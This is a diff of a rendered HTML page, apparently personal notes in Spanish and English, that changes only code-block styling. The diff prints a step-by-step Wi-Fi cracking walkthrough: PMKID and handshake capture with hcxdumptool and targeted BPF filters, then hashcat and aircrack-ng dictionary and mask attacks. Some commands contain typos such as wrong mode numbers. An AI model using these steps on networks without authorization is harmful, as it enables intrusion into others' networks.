@@ -113,60 +113,60 @@ Desde la versión 6.3.0 las opciones hay cambiados por problemas de rendimiento.
   <p>Al hacer un ataque PMKID no es necesario desautenticar al cliente para capturar el handshake. Este ataque se puede realizar sin clientes.</p>
 <p>Este ataque también se puede hacer con Airgeddon.</p>
 <p>Es obligatorio detener todos los servicios que acceden a tu interfaz en mi caso:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo systemctl stop NetworkManager
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo systemctl stop NetworkManager
 </span></span><span style="display:flex;"><span>sudo systemctl stop wpa_supplicant
 </span></span></code></pre></div><p>Es importante tener la última versión de <code>hcxdumptool</code>:</p>
 <p>Desde la versión 6.3.0 las opciones hay cambiados por problemas de rendimiento.  Esto fue mencionado en el changelog.</p>
 <p>Para atacar una MAC ADDRESS en específico se crea un Berkeley Packet Filter</p>
 <p>Con <code>airodump</code> obtenés el BBSID y luego:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo airmon-ng check kill
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo airmon-ng check kill
 </span></span><span style="display:flex;"><span>sudo airodump-ng wlp1s0
 </span></span></code></pre></div><p>Just create a Berkeley Packet Filter and add it to hcxdumptool.  Steps to create a simple filter: set monitor mode</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ hcxdumptool -m INTERFACENAME
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ hcxdumptool -m INTERFACENAME
 </span></span></code></pre></div><p>create the filter (this example use 11:22:33:44:55:66 as target address)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ sudo tcpdump -i INTERFACENAME wlan addr1 11:22:33:44:55:66 or wlan addr2 11:22:33:44:55:66 or wlan addr3 11:22:33:44:55:66 -ddd &gt; attack.bpf
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ sudo tcpdump -i INTERFACENAME wlan addr1 11:22:33:44:55:66 or wlan addr2 11:22:33:44:55:66 or wlan addr3 11:22:33:44:55:66 -ddd &gt; attack.bpf
 </span></span></code></pre></div><p>run hcxdumptool with the filter:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ sudo hcxdumptool -i INTERFACENAME -w dumpfile.pcapng -F --rds<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> --bpf<span style="color:#f92672">=</span>attack.bpf
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ sudo hcxdumptool -i INTERFACENAME -w dumpfile.pcapng -F --rds<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> --bpf<span style="color:#f92672">=</span>attack.bpf
 </span></span></code></pre></div><h4 id="es-posible-tener-2-o-más-direcciones-mac-de-destino-y-en-caso-afirmativo-qué-es-la-sintaxis-correcta">¿Es posible tener 2 o más direcciones MAC de destino y, en caso afirmativo, qué es la sintaxis correcta?</h4>
 <p>basic BPF example for two target APs: <code>AP1 = 11:12:13:14:15:16</code> <code>AP2 = 21:22:23:24:25:26</code> <code>&quot;wlan addr3 11:12:13:14:15:16 or wlan addr3 21:22:23:24:25:26&quot;</code></p>
 <h4 id="crear-un-ap-y-muchos-clientes">Crear un AP y muchos clientes</h4>
 <p>Command line is wrong, because it build tcpdump default snaplen of 65535 bytes while hcxdumptool&rsquo;s snaplen is 1024.</p>
 <p>Attack filter on CLIENTs mostly do not work as expected due to MAC randomization by nearly all CLIENTs.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tcpdump -s <span style="color:#ae81ff">1024</span> -y IEEE802_11_RADIO wlan addr3 aaaaaaaaaaaa or wlan addr3 bbbbbbbbbbbb or wlan addr1 dddddddddddd or wlan addr2 dddddddddddd or wlan addr1 eeeeeeeeeeee or wlan addr2 eeeeeeeeeeee -ddd &gt; filter.bpf
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tcpdump -s <span style="color:#ae81ff">1024</span> -y IEEE802_11_RADIO wlan addr3 aaaaaaaaaaaa or wlan addr3 bbbbbbbbbbbb or wlan addr1 dddddddddddd or wlan addr2 dddddddddddd or wlan addr1 eeeeeeeeeeee or wlan addr2 eeeeeeeeeeee -ddd &gt; filter.bpf
 </span></span></code></pre></div><p><a href="https://github.com/ZerBea/hcxdumptool/discussions/348">https://github.com/ZerBea/hcxdumptool/discussions/348</a></p>
 <hr>
 <h4 id="capturar-handshake">Capturar handshake:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hcxdumptool -i INTERFACE -w dumpfile.pcapng -F --rds<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hcxdumptool -i INTERFACE -w dumpfile.pcapng -F --rds<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
 </span></span></code></pre></div><p>Luego de 3 minutos, detené la captura con Control+C y vas a tener los paquetes capturados en tu directorio home: hash.hc22000 y esidist l handshake será guardado en <code>dumpfile.pcaapng</code></p>
 <p>Podés intentar romper el handshake usando hashcat:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng
 </span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">2200</span> -o wordlist.txt hash.hc2200
 </span></span></code></pre></div><h4 id="atacando-con-aircrack">Atacando con aircrack</h4>
 <p>Aircrack no soporta pcapng asi que tenés que transformarlo usando el siguiente comando:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tshark -r foo.pcapng -w foo.pcap -F libcap
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tshark -r foo.pcapng -w foo.pcap -F libcap
 </span></span><span style="display:flex;"><span>tcpdump -r dumpfile.pcapng -w foo.pcap
 </span></span><span style="display:flex;"><span>aircrack-ng -w rockyou.txt foo.pcap
 </span></span></code></pre></div><hr>
 <p>Command summary for Wi-Fi security audit</p>
 <h5 id="old-command-arguments">OLD COMMAND ARGUMENTS:</h5>
 <p>Network interface names:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hcxdumptool -I
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hcxdumptool -I
 </span></span></code></pre></div><h5 id="old-command-arguments-1">OLD COMMAND ARGUMENTS:</h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hcxdumptool -L
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hcxdumptool -L
 </span></span></code></pre></div><p>A typical command for capturing data:</p>
 <h5 id="old-command-arguments-2">OLD COMMAND ARGUMENTS:</h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hcxdumptool -i INTERFACE -o file.pcapng --active_beacon --enable_status<span style="color:#f92672">=</span><span style="color:#ae81ff">15</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hcxdumptool -i INTERFACE -o file.pcapng --active_beacon --enable_status<span style="color:#f92672">=</span><span style="color:#ae81ff">15</span>
 </span></span></code></pre></div><h5 id="new-command-arguments">NEW COMMAND ARGUMENTS:</h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hcxdumptool -i INTERFACE -w dumpfile.pcapng -F --rds<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hcxdumptool -i INTERFACE -w dumpfile.pcapng -F --rds<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
 </span></span></code></pre></div><p>Captured wireless frames are saved to dumpfile.pcapng file. Convert this file to hashes:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng
 </span></span></code></pre></div><p>A hash.hc22000 file with hashes will be created.</p>
 <p>To view information about hashes, use the hcxhashtool utility:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hcxhashtool --info<span style="color:#f92672">=</span>stdout -i hash.hc22000
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hcxhashtool --info<span style="color:#f92672">=</span>stdout -i hash.hc22000
 </span></span></code></pre></div><p>Dictionary attack:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">22000</span> -a <span style="color:#ae81ff">0</span> hash.hc22000 СЛОВАРЬ.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">22000</span> -a <span style="color:#ae81ff">0</span> hash.hc22000 СЛОВАРЬ.txt
 </span></span></code></pre></div><p>Mask attack example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">22000</span> -a <span style="color:#ae81ff">3</span> hash.hc22000 ?d?d?d?d?d?d?d?d
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">22000</span> -a <span style="color:#ae81ff">3</span> hash.hc22000 ?d?d?d?d?d?d?d?d
 </span></span></code></pre></div><p>Stop processes that might interfere with handshake and PMKID capturing</p>
 <p>Wi-Fi network security audit can be divided into:</p>
 <ul>
@@ -180,7 +180,7 @@ Desde la versión 6.3.0 las opciones hay cambiados por problemas de rendimiento.
 <p>During the online stage, it is strongly recommended to stop services that may
 interfere with the operation of network interfaces:</p>
 <hr>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo systemctl stop NetworkManager
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo systemctl stop NetworkManager
 </span></span><span style="display:flex;"><span>sudo systemctl stop wpa_supplicant
 </span></span></code></pre></div><p>After the capturing of handshakes and PMKID is complete, you can start
 NetworkManager again (wpa_supplicant will be started automatically):</p>
@@ -695,7 +695,7 @@ hashcat &ndash;hwmon-temp-abort=100 -a 3 -m 22000 -d 1 RT-728005.hash ?d?d?d?d?d
 <h3 id="-i-wlan0mon--as-mentioned-in-help-it-is-not-recommended-to-run-hcxdumptool-on-a-virtual-monitor-interface-do-not-use-scripts-like-airmon-ng-to-set-monitor-mode-before-you-run-hcxdumptool-because-hcxdumtool-set--its-own-monitor-mode">-i wlan0mon &ndash;&gt; as mentioned in help it is not recommended to run hcxdumptool on a virtual monitor interface!!!!!! Do not use scripts like airmon-ng to set monitor mode before you run hcxdumptool, because hcxdumtool set  its own monitor mode!!!!!</h3>
 <h3 id="cadena-de-scripts-que-hay-que-usar">Cadena de scripts que hay que usar:</h3>
 <p><code>hcxdumptool -&gt; hcxpcapngtool -&gt; hcxhashtool (additional hcxpsktool/hcxeiutool) -&gt; Hashcat</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo su
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo su
 </span></span><span style="display:flex;"><span>ifconfig <span style="color:#75715e"># Ver nombre de tu interfaz WiFi.</span>
 </span></span><span style="display:flex;"><span>airdump-ng wlp1s0 <span style="color:#75715e"># Guarda la BSSID de la red que querés atacar en un archivo de texto </span>
 </span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;BSSID&#34;</span> &gt; myfilter.txt
@@ -706,23 +706,23 @@ hashcat &ndash;hwmon-temp-abort=100 -a 3 -m 22000 -d 1 RT-728005.hash ?d?d?d?d?d
 <p><code>-o</code> fue reemplazado por <code>-w</code>
 <code>--filterlist=f2-text.txt</code> fue reemplazado por <code>--bpf</code>
 <code>--filtermode=2</code> fue reemplazado por <code>--bpf</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/ZerBea/hcxdumptool
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/ZerBea/hcxdumptool
 </span></span><span style="display:flex;"><span>make
 </span></span><span style="display:flex;"><span>sudo make install
 </span></span><span style="display:flex;"><span>hcxdumptool -I 
 </span></span><span style="display:flex;"><span>hcxdumptool -i INTERFACE -o file.pcapng --active_beacon --enable_status<span style="color:#f92672">=</span><span style="color:#ae81ff">15</span>
 </span></span></code></pre></div><p>Posibles errores:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Possible reasons:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Possible reasons:
 </span></span><span style="display:flex;"><span> driver is broken
 </span></span><span style="display:flex;"><span> driver is busy <span style="color:#f92672">(</span>misconfigured system, other services access the INTERFACE<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">4772</span> Packet<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> captured by kernel
 </span></span></code></pre></div><p>Solución:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo systemctl stop NetworkManager
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo systemctl stop NetworkManager
 </span></span><span style="display:flex;"><span>sudo systemctl stop wpa_supplicant
 </span></span></code></pre></div><p><a href="https://www.hackingarticles.in/wireless-penetration-testing-pmkid-attack/">https://www.hackingarticles.in/wireless-penetration-testing-pmkid-attack/</a></p>
 <h4 id="si-querés-seguir-este-tutorial-que-ya-está-desactualizado-yo-me-bajé-la-versión-606">Si querés seguir este tutorial que ya está desactualizado yo me bajé la versión 6.0.6</h4>
 <p>Primero de todo tenés que matar <code>wpa_supplicant</code> y <code>NetworkManager</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo airmon-ng check kill
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo airmon-ng check kill
 </span></span></code></pre></div><p><a href="https://miloserdov.org/?p=7801">https://miloserdov.org/?p=7801</a></p>
 <p>Los parámetros de ese tutorial funcionan con esta versión: <br>
 <a href="https://github.com/ZerBea/hcxdumptool/archive/refs/tags/6.0.6.tar.gz">https://github.com/ZerBea/hcxdumptool/archive/refs/tags/6.0.6.tar.gz</a></p>
